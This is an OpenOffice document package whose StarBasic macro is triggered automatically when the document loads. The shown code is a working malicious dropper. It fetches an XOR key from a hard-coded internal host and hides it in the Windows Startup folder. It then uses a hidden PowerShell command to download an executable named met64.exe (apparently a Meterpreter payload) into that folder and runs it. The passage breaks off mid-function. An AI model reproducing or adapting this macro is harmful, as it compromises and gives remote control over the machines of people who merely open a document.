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event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2024-04-11T21:59:55.53</dc:date>
    <dc:creator>john </dc:creator>
    <meta:editing-duration>PT10H16M20S</meta:editing-duration>
    <meta:editing-cycles>52</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.15$Win32 OpenOffice.org_project/4115m2$Build-9813</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/Module1.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Global xk As Integer

    Sub OnLoad
      Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Stager
        Executor

      end If
    End Sub

    Function HexToBytes(hexString As String) As String
        Dim result As String
        result = ""
        For i = 1 To Len(hexString) Step 2
            Dim hexChar As String
            hexChar = Mid(hexString, i, 2)
            result = result &amp; Chr(CLng("&amp;H" &amp; hexChar))
        Next i
        HexToBytes = result
    End Function
    
    Function XORDecrypt(encryptedHex As String, key As Integer) As String
        Dim encryptedBytes As String
        encryptedBytes = HexToBytes(encryptedHex) 

        Dim result As String
        result = ""
        For i = 1 To Len(encryptedBytes)
            Dim c As String
            c = Mid(encryptedBytes, i, 1)
            result = result &amp; Chr(Asc(c) Xor key)
        Next i
        XORDecrypt = result
    End Function

    Sub Stager
		Dim http_object As Object
	    Dim response As String
	    Dim xorKey As Integer
		Dim fileURL As String
	    Dim outputFile As Object
	    Dim outputStream As Object
	    Dim lockStateFilePath As String
		docBaseName = "adv"
      	' Call the function to get the document's base name
      	docBaseName = GetDocBaseName()
	    ' Send a synchronous request to get the XOR key
      	keyFileName = docBaseName &amp; "_key"
      	keyFileURL = "http://192.168.1.66:8888/odt_folder_keys/" &amp; keyFileName &amp; ".txt"
	    ' Create the HTTP request object
	    Set http_object = CreateObject("Microsoft.XMLHTTP")

     	http_object.Open "GET", keyFileURL, False
      	http_object.Send
	    response = http_object.responseText
	
	    ' Convert the response to an integer (XOR key)
	    xorKey = Val(response)
		xk = xorKey
		
	    WriteKeyToFile(docBaseName, xorKey)
		
		Shell("cmd.exe /C ""powershell.exe -nop -w hidden -c  Invoke-WebRequest -Uri 'http://192.168.1.66:8888/met64.exe' -OutFile ""$env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup\met64.exe"";""")
    End Sub

	Function LastIndexOf(haystack As String, needle As String) As Integer
	    Dim i As Integer
	    LastIndexOf = 0 ' Default return value if not found
	    For i = Len(haystack) To 1 Step -1
	        If Mid(haystack, i, Len(needle)) = needle Then
	            LastIndexOf = i
	            Exit Function
	        End If
	    Next i
	End Function
    
    Sub WriteKeyToFile(filename as String, xorKey As Integer)
	    Dim oSimpleFileAccess As Object
	    Dim oOutputStream As Object
	    Dim fileURL As String
	    Dim lockStateFileName As String
	    Dim lockStateFilePath As String
	    Dim startupFolderPath As String
	    Dim shellCommand As String
	
	    ' Get the APPDATA path from environment variables and construct the target path
	    startupFolderPath = Environ("APPDATA") &amp; "/Microsoft/Windows/Start Menu/Programs/Startup/"
	    
	    ' Define the lock state file name
	    lockStateFileName = "." &amp; filename &amp; "-lock-state"
	    
	    ' Convert the local file path to URL format for LibreOffice API
	    lockStateFilePath = startupFolderPath &amp; lockStateFileName
	    fileURL = ConvertToURL(lockStateFilePath)
	    
	    ' Obtain the service used to perform file operations
	    oSimpleFileAccess = createUnoService("com.sun.star.ucb.SimpleFileAccess")
	    
	    ' Create or open the file for writing
	    oOutputStream = createUnoService("com.sun.star.io.TextOutputStream")
	
	    If Not oSimpleFileAccess.exists(fileURL) Then
	        ' If the file doesn't exist, create it
	        oSimpleFileAccess.writeFile(fileURL, Array())
	    End If
	    
	    ' Associate the output stream with the file for writing
	    oOutputStream.setOutputStream(oSimpleFileAccess.openFileWrite(fileURL))
	    
	    ' Write the XOR key to the file
	    oOutputStream.writeString(CStr(xorKey))
	    oOutputStream.closeOutput()
	    
	    ' Construct the shell command to hide the file
	    shellCommand = "attrib +h """ &amp; startupFolderPath &amp; lockStateFileName &amp; """"

	    ' Use Shell() to execute the command
	    Shell("cmd.exe /C " &amp; shellCommand, vbHide)
	End Sub

	Function GetPathSeparator() As String
	    #If GetOS()="windows" Then
	        GetPathSeparator = "\"
	    #Else
	        GetPathSeparator = "/"
	    #EndIf
	End Function

	Function GetDocBaseName() As String
	    Dim oDoc As Object
	    Dim docURL As String
	    Dim docPath As String
	    Dim lastSlash As Integer
	    Dim lastDot As Integer
	
	    ' Obtain the current document object
	    oDoc = ThisComponent
	
	    ' Get the document's URL
	    docURL = oDoc.getURL()
	
	    ' Convert the URL to a system file path
	    docPath = ConvertFromURL(docURL)
	
	    ' Find the last slash to isolate the filename
	    lastSlash = LastIndexOf(docPath, GetPathSeparator())
	
	    ' Find the last dot in the filename to isolate the base name
	    lastDot = LastIndexOf(docPath, ".")
	
	    ' Extract the base name
	    If lastSlash &lt; lastDot Then
	        GetDocBaseName = Mid(docPath, lastSlash + 1, lastDot - lastSlash - 1)
	    Else
	        ' No dot found after the last slash, or both not found
	        GetDocBaseName = Mid(docPath, lastSlash + 1)
	    End If
	End Function

    

	
	Sub Executor
	    Dim executablePath As String
	    Dim result
	    
	    ' Define the executable name and path
	    executableName = "met64.exe"
	    startupFolderPath = Environ("APPDATA") &amp; "\Microsoft\Windows\Start Menu\Programs\Startup\"
	    executablePath = startupFolderPath &amp; executableName
	   	Wait 5000 
	    ' Run the executable (use the xorKey if necessary here)
	    result = Shell(executablePath, vbNormalFocus)
	End Sub

   
    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function

    Function GetExtName() as string
      select case GetOS
        case "windows"
          GetFileName = "exe"
        case else
          GetFileName = "bin"
      end selec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